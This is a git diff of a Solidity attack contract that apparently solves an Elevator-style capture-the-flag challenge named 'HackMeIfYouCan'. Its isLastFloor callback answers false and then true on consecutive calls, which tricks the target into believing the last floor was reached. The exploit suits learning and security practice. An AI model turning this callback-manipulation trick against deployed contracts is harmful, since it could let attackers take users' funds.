@@ -1,27 +1,29 @@
-// pragma solidity ^0.7.0;
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.7.0;
 
-// interface Elevator {
-//     function goTo(uint _floor) external;
-// }
+import "./HackMeIfYouCan.sol";
 
-// contract Building {
-//     bool private mySwitch;
-//     Elevator public elevatorInstance;
+contract BuildingContract {
+    HackMeIfYouCan public hackMeIfYouCan;
+    bool public switchFlipped = false;
 
-//     constructor(address _elevatorAddress) {
-//         elevatorInstance = Elevator(_elevatorAddress);
-//     }
+    constructor(address contractAdrress) {
+        hackMeIfYouCan = HackMeIfYouCan(payable(contractAdrress));
+    }
 
-//     function startAttack() external {
-//         elevatorInstance.goTo(0);
-//     }
+    function hack() public {
+        hackMeIfYouCan.goTo(1);
+    }
 
-//     function isLastFloor(uint _floor) external returns (bool) {
-//         if (!mySwitch) {
-//             mySwitch = true;
-//             return false;
-//         } else {
-//             return true;
-//         }
-//     }
-// }
+    function isLastFloor(uint) public returns (bool) {
+        // first call
+        if (!switchFlipped) {
+            switchFlipped = true;
+            return false;
+            // second call
+        } else {
+            switchFlipped = false;
+            return true;
+        }
+    }
+}
